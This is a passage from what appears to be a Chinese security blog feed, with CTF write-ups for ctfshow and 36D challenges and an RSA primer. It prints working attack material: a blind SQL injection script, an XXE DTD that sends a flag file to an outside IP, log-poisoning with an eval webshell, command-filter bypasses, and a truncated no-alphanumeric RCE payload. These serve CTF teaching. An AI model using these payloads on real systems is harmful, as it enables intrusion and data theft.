if(preg_match(&#39;&#x2F;\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\&#96;|\~|\+|\&#39;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0&#x2F;&#39;, $url))&#123;        die(&#39;仅限域名地址访问&#39;);    &#125;    system(&#39;curl &#39;.$url);&#125;</code></pre><p><code>payload</code>：<code>/?url=http://192。168。7。68/flag</code></p><p>原因是curl中可以用<code>。</code>替换<code>.</code></p><p>另外，ip可以使用十进制进行访问，即<code>http://3232237380/flag</code>，但题目过滤了0</p><h3 id="Web2-观星"><a href="#Web2-观星" class="headerlink" title="Web2_观星"></a>Web2_观星</h3><p>url可以给id传值，当传入一个引号的时候回显<code>enheng?</code>，推测sql注入</p><p>FUZZ测试发现过滤了以下的内容（长度为533的）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200801213125358.png" alt loading="lazy"></p><p>未过滤<code>^</code>，考虑布尔盲注</p><p>payload：</p><p><code>id=1^case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end.format(i,j)</code></p><p>过滤了逗号，<code>if</code>无法使用则用<code>case...when...then...else...end</code>代替绕过，<code>substr</code>中的逗号用<code>substr(...from...for...)</code>代替绕过</p><p>接下来就可以写脚本了</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;dc894a39-ba77-4e9f-9201-e52d7a19ba5c.chall.ctf.show&#x2F;index.php?id&#x3D;1^&#39;# payload &#x3D; &#39;case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;   web1# payload &#x3D; &#39;case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;    flag,page,user# payload &#x3D; &#39;case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp(0x666C6167)))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;    FLAG_COLUMN,flagpayload &#x3D; &#39;case(ord(substr((select(flag)from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;flag &#x3D; &#39;&#39;for i in range(1, 128):    for j in range(38, 126):        urls &#x3D; url+payload.format(i, j)        request &#x3D; requests.get(urls)        if &#39;I asked nothing&#39; in request.text:            flag +&#x3D; chr(j)            print(flag)            break</code></pre><h3 id="Web3-观图"><a href="#Web3-观图" class="headerlink" title="Web3_观图"></a>Web3_观图</h3><p>showImage.php可看到源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;$key &#x3D; substr(md5(&#39;ctfshow&#39;.rand()),3,8);&#x2F;&#x2F;flag in config.phpinclude(&#39;config.php&#39;);if(isset($_GET[&#39;image&#39;]))&#123;    $image&#x3D;$_GET[&#39;image&#39;];    $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key);    if(file_exists($str))&#123;        header(&#39;content-type:image&#x2F;gif&#39;);        echo file_get_contents($str);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>图片链接为<code>/showImage.php?image=Z6Ilu83MIDw=</code></p><p>可以看到图片文件名是<code>Z6Ilu83MIDw=</code>经过<code>bf-ecb</code>算法用<code>$key</code>得到的，再看<code>$key</code>的生成方式</p><pre class="language-php" data-language="php"><code class="language-php">substr(md5(&#39;ctfshow&#39;.rand()),3,8);</code></pre><p>查询<code>rand()</code>函数，若里面的参数为空，则返回<code>0</code>到<code>getrandmax()</code>之间的伪随机整数</p><p><code>getrandmax()</code>函数返回随机数可能返回的最大值，既然有上限即可进行爆破来得出<code>key</code>值</p><p>脚本如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    for($i&#x3D;0;$i&lt;getrandmax();$i++)&#123;        $key &#x3D; substr(md5(&#39;ctfshow&#39;.$i),3,8);  &#x2F;&#x2F;5a78dbb4        $image&#x3D;&quot;Z6Ilu83MIDw&#x3D;&quot;;        $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key);        if(strpos($str,&quot;gif&quot;) or strpos($str,&quot;jpg&quot;) or strpos($str,&quot;png&quot;))&#123;            print($str.&quot;\n&quot;);            print($i.&quot;\n&quot;);            print($key.&quot;\n&quot;);            break;        &#125;    &#125;    $flag &#x3D; openssl_encrypt(&#39;config.php&#39;, &#39;bf-ecb&#39;, &#39;5a78dbb4&#39;);    print($flag);</code></pre><p>得到<code>N6bf8Bd8jm0SpmTZGl0isw==</code>，为<code>config.php</code>加密后的<code>base64</code>码，访问<code>/showImage.php?image=N6bf8Bd8jm0SpmTZGl0isw==</code>，F12打开复制代码base64解密得到<code>config.php</code>的内容，<code>flag</code>即在其中。</p><h3 id="Web4-观心"><a href="#Web4-观心" class="headerlink" title="Web4_观心"></a>Web4_观心</h3><p>抓包发现有<code>api.php</code>文件，并且带有请求<code>api</code>和<code>city</code>两个数据</p><p><code>api</code>携带的是一个网址，是一个xml文件，由此判断考的应该是XXE外部实体注入</p><p>于是构建攻击环境</p><p>在公网服务器上编写两个文件</p><p>xxe.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE root[    &lt;!ENTITY % dtd SYSTEM "http://ip/xxe.dtd">    %dtd;]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>woojay<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>xxe.dtd</p><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.106.160.176:5000&#x2F;%file;&#39;&gt;&quot;&gt;%int;%send;</code></pre><p>随后在服务器上监听5000端口，即可得到<code>flag.txt</code>的 <code>base64</code>编码后的结果，解码既是flag</p><p>不监听端口也可以，直接发包请求，会把报错的结果返回，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200804113715125.png" alt loading="lazy"></p><p>XXE这块不是很了解，原理后面再仔细研究一下</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在菜鸡的道路上越走越远。。。淦！&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>RSA算法浅析</title>
    <link href="https://www.extrader.top/posts/aa76c91b/"/>
    <id>https://www.extrader.top/posts/aa76c91b/</id>
    <published>2020-08-01T14:08:36.000Z</published>
    <updated>2020-08-01T14:08:36.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数论知识"><a href="#数论知识" class="headerlink" title="数论知识"></a>数论知识</h3><ol><li><p><strong>互质</strong>：如果两个正整数，除了 1 以外没有其他的公因数，则他们互质。比如，14 和 15 互质。注意，两个数构成互质关系，他们不一定需要是质数，比如 7 和 9。</p></li><li><p><strong>欧拉函数</strong>：用于计算任意正整数 <code>n</code>，在 <code>&lt;=n</code> 的正整数中，与 <code>n</code> 互质的正整数个数。</p></li><li><p><strong>欧拉定理</strong>：如果两个正整数 a 和 n 互质，则如下等式成立。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173237556.png" alt loading="lazy"></p></li><li><p><strong>费马小定理</strong>：欧拉函数中的一个特殊情况，如果  <code>n</code>  是质数，而 <code>a</code> 不是 <code>n</code> 的倍数，此时 <code>a</code> 和 <code>n</code> 必然互质。因为<code>n</code>的欧拉函数值 = <code>n-1</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173548812.png" alt loading="lazy"></p></li><li><p><strong>模反元素</strong>：如果两个正整数 <code>a</code> 和 <code>n</code> 互质，那么一定可以找到一个正整数 <code>b</code>，使得 <code>ab - 1</code> 被 <code>n</code> 整除。这个时候，<code>b</code> 就叫做 <code>a</code> 的 模反元素。</p></li></ol><h3 id="关键参数"><a href="#关键参数" class="headerlink" title="关键参数"></a>关键参数</h3><p><code>(e,n)</code>：公钥</p><p><code>(d,n)</code>：私钥</p><p><code>p,q</code>：<code>n=p*q</code> ，<code>p</code>和<code>q</code>都是两个大素数</p><p><code>c</code>：密文</p><p><code>m</code>：明文</p><p><code>n,e</code>是公开的情况下，想要知道<code>d</code>的值，必须要将<code>n</code>分解计算出<code>n</code>的欧拉函数值，而<code>n</code>是两个大素数<code>p，q</code>的乘积，将其分解是困难的。</p><h3 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h3><p>取两个大质数<code>p,q</code>，并计算他们的乘积<code>n</code>，一般要求<code>n</code>换算成二进制要大于2048位</p><p>则根据欧拉定理满足以下条件（欧拉函数）：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172139842.png" alt loading="lazy"></p><p>计算<code>n</code>的欧拉函数值</p><p>选择一个数<code>e</code>使得<code>e</code>与<code>n</code>的欧拉函数值互质，一般选择65537</p><p>计算<code>e</code>相对<code>n</code>的欧拉函数值的模反元素<code>d</code>，因为<code>e</code>与<code>n</code>的欧拉函数值互质，则根据模反元素的性质</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172706077.png" alt loading="lazy"></p><p>根据扩展欧几里得算法，通过迭代求解即可解出<code>d</code>，随后即生成公钥<code>(e,N)</code>，私钥<code>(d,N)</code></p><h3 id="加解密的实现"><a href="#加解密的实现" class="headerlink" title="加解密的实现"></a>加解密的实现</h3><p>加密：</p><p><code>m</code>为要加密的信息，<code>(e,n)</code>组合起来为公钥，<code>c</code>和<code>k</code>分别为常数</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211116338.png" alt loading="lazy"></p><p>解密：</p><p><code>m</code>为要解密的信息，<code>(d,n)</code>组合起来为私钥，<code>c</code>和<code>k</code>分别为常数</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211144409.png" alt loading="lazy"></p><p>两个公式可相互推导</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;数论知识&quot;&gt;&lt;a href=&quot;#数论知识&quot; class=&quot;headerlink&quot; title=&quot;数论知识&quot;&gt;&lt;/a&gt;数论知识&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;互质&lt;/strong&gt;：如果两个正整数，除了 1 以外没有其他的公因数，则他们互质。比如，
      
    
    </summary>
    
    
      <category term="算法" scheme="https://www.extrader.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://www.extrader.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>36D杯五道代码审计题</title>
    <link href="https://www.extrader.top/posts/e53b958d/"/>
    <id>https://www.extrader.top/posts/e53b958d/</id>
    <published>2020-06-03T16:00:00.000Z</published>
    <updated>2020-06-03T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>“温故而知新，可以为师矣”——孔子《论语》</p><a id="more"></a><h3 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h3><p>访问<code>index.php.bak</code>得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">visit all_info_u_want.php and you will get all information you want&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:&lt;?phperror_reporting(0);&#x2F;&#x2F;give you all information you wantif (isset($_GET[&#39;all_info_i_want&#39;])) &#123;    phpinfo();&#125;if (isset($_GET[&#39;file&#39;])) &#123;    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];    &#x2F;&#x2F;really baby include    include($file);&#125;?&gt;really really really baby challenge right? </code></pre><p>根据源码提示传入<code>all_info_u_want.php?all_info_i_want</code>，得到<code>phpinfo()</code>的结果，<code>flag</code>并不在这里</p><p>传入<code>all_info_u_want.php?file=../../../../../../etc/passwd</code>，可以看到<code>/etc/passwd</code>的内容，目录穿越，再传入<code>all_info_u_want.php?file=../../../../../../flag</code>试图读取flag，得到信息如下：</p><p><code>flag&#123;this_is_fake_flag_realflag_is_in_/etc_find_it_by_yourself&#125;</code></p><p>根据提示可以知道flag应该在<code>etc</code>目录下，慢猜不好搞，没那个运气</p><p>先来看看用的是什么web服务器，抓包可以看到是<code>Nginx</code>服务器，尝试读取<code>Nginx</code>的敏感信息文件，网上查得<code>Nginx</code>的访问日志文件默认路径为<code>/var/log/nginx/access.log</code>，尝试读取，得到日志文件结果，该日志文件回保存访问的<code>User-Agent</code>的内容，结合文件包含，我们可以在<code>User-Agent</code>中注入恶意代码，从而<code>getshell</code>，</p><pre class="language-none"><code class="language-none">GET &#x2F;all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log HTTP&#x2F;1.1Host: 16636aaf-35bc-4ac1-993c-95897de4ec8e.chall.ctf.showUser-Agent: &lt;?php phpinfo();?&gt;</code></pre><p>成功执行php代码，于是传入<code>User-Agent: &lt;?php eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>利用pass反弹shell后执行<code>find etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</code>，得到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge"></a>WEB_WUSTCTF朴实无华Revenge</h3><p>拿到题目得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpheader(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123;    $len&#x3D;strlen($str);    $l&#x3D;1;    $k&#x3D;intval($len&#x2F;2)+1;    for($j&#x3D;0;$j&lt;$k;$j++)        if (substr($str,$j,1)!&#x3D;substr($str,$len-$j-1,1)) &#123;            $l&#x3D;0;            break;        &#125;    if ($l&#x3D;&#x3D;1) return true;    else return false;&#125;&#x2F;&#x2F;level 1if (isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    $numPositve &#x3D; intval($num);  &#x2F;&#x2F; 获取变量的整数值    if ($num !&#x3D; $numPositve) &#123;        die(&#39;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#39;);    &#125;    $numReverse &#x3D; intval(strrev($num));  &#x2F;&#x2F; 反转字符串    if (preg_match(&#39;&#x2F;[^0-9.-]&#x2F;&#39;, $num)) &#123;        die(&quot;非洲欢迎你1&quot;);    &#125;    if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999) &#123; &#x2F;&#x2F;在64位系统中 intval()的上限不是2147483647 省省吧        die(&quot;非洲欢迎你2&quot;);    &#125;    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num))&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧1&quot;);&#125;&#x2F;&#x2F;level 2if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5(md5($md5)))        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;    else        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;</code></pre><p>先一层层绕过，首先第一个<code>if</code>，传入num，简单来说就是</p><ul><li>num结果取整后和原来的字符串需要相等，但是这里只需要<code>==</code>即可</li><li>num需要为数字，取整后的数字不能小于-999999999999999999或者大于999999999999999999</li><li>num在经过取整和反转字符串后取整后的数字需要相等</li><li>num经过<code>isPalindrome</code>函数返回的值需要为<code>false</code></li></ul><p>再来看看<code>isPalindrome</code>函数，字符串两边对称的数字需要有不一样，才能使<code>$l=0</code>，返回<code>false</code>这样与前面的条件就矛盾了，反转后又需要相等，又不能对称。</p><p>以下提供两种绕过方式：</p><pre class="language-none"><code class="language-none">00.01000000000000000.00000000000000010</code></pre><p>第一种确实是没有任何操作就直接绕过了，而第二种则是浮点数的精度问题，在服务器上</p><p><code>var_dump(intval(1000000000000000.00000000000000010) === intval(strrev(1000000000000000.00000000000000010)));</code></p><p>是可以返回true的，但是我在本地测试到</p><p><code>var_dump(intval(1000000.00000010) === intval(strrev(1000000.00000010)));</code></p><p>就返回false了，不知道什么鬼-.-</p><p>再绕过第二个if</p><p>这个需要让<code>$md5==md5(md5($md5))</code>，弱比较，绕如果md5=0exxxxxxxx，经过两次md5加密后的md5值也为0exxxxxxxx，即可绕过</p><p>写个脚本爆破即可，这样的字符串挺多的，以下列举几个：</p><pre class="language-none"><code class="language-none">0e3900184182-&gt;0e1418721190302697727652753637950e6201668706-&gt;0e7985422574949326206502419486330e6702291282-&gt;0e1005063503807650968114418218160e1808236718-&gt;0e9355671365452205537103932527520e9507776345-&gt;0e8846062744707241436539484045430e7208324299-&gt;0e0296373600831971546521412019920e2010692162-&gt;0e5148989988791743362037461270580e9410970854-&gt;0e4302790236499053907065604760830e3511282263-&gt;0e657335831331991043075342997270</code></pre><p>再到最后get flag</p><p>过滤了挺多的命令，但是还是可以绕过：</p><pre class="language-shell" data-language="shell"><code class="language-shell">nl&lt;&#x2F;flag|nlrev&lt;&#x2F;flag|rev</code></pre><p>随后即可拿到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge-Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge-Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge_Revenge"></a>WEB_WUSTCTF朴实无华Revenge_Revenge</h3><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpheader(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123;    $len&#x3D;strlen($str);    $l&#x3D;1;    $k&#x3D;intval($len&#x2F;2)+1;    for($j&#x3D;0;$j&lt;$k;$j++)        if (substr($str,$j,1)!&#x3D;substr($str,$len-$j-1,1)) &#123;            $l&#x3D;0;            break;        &#125;    if ($l&#x3D;&#x3D;1) return true;    else return false;&#125;&#x2F;&#x2F;level 1if (isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    $numPositve &#x3D; intval($num);    $numReverse &#x3D; intval(strrev($num));    if (preg_match(&#39;&#x2F;[^0-9.]&#x2F;&#39;, $num)) &#123;        die(&quot;非洲欢迎你1&quot;);    &#125; else &#123;        if ( (preg_match_all(&quot;&#x2F;\.&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num)&#x3D;&#x3D;1 &amp;&amp; !preg_match(&#39;&#x2F;^[-]&#x2F;&#39;, $num))) &#123;            die(&quot;没有这样的数&quot;);        &#125;    &#125;    if ($num !&#x3D; $numPositve) &#123;        die(&#39;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#39;);    &#125;    if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999) &#123; &#x2F;&#x2F;在64位系统中 intval()的上限不是2147483647 省省吧        die(&quot;非洲欢迎你2&quot;);    &#125;    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;level 2if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5(md5($md5)))        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;    else        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);        if (preg_match(&quot;&#x2F;[&#39;\*\&quot;[?]&#x2F;&quot;, $get_flag)) &#123;            die(&#39;非预期修复*2&#39;);        &#125;        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;</code></pre><p>这题和上题差不多，只是最后的命令多过滤了一些，直接给出payload：</p><pre class="language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e2010692162&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</code></pre><h3 id="WEB-你取吧"><a href="#WEB-你取吧" class="headerlink" title="WEB_你取吧"></a>WEB_你取吧</h3><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);show_source(__FILE__);$hint&#x3D;file_get_contents(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hhh.php&#39;);$code&#x3D;$_REQUEST[&#39;code&#39;];$_&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,&#39;l&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;\~&#39;,&#39;\^&#39;);$blacklist &#x3D; array_merge($_);foreach ($blacklist as $blacklisted) &#123;    if (preg_match (&#39;&#x2F;&#39; . $blacklisted . &#39;&#x2F;im&#39;, $code)) &#123;        die(&#39;nonono&#39;);    &#125;&#125;eval(&quot;echo($code);&quot;);?&gt;</code></pre><p>直接给出P神的payload(无字母数字的RCE)：</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p>GET：</p><pre class="language-php" data-language="php"><code class="language-php">?code&#x3D;%22%22%29%3b%24%5f%3d%5b%5d%3b%24%5f%3d%40%22%24%5f%22%3b%24%5f%3d%24%5f%5b%27%21%27%3d%3d%27%40%27%5d%3b%24%5f%5f%5f%3d%24%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24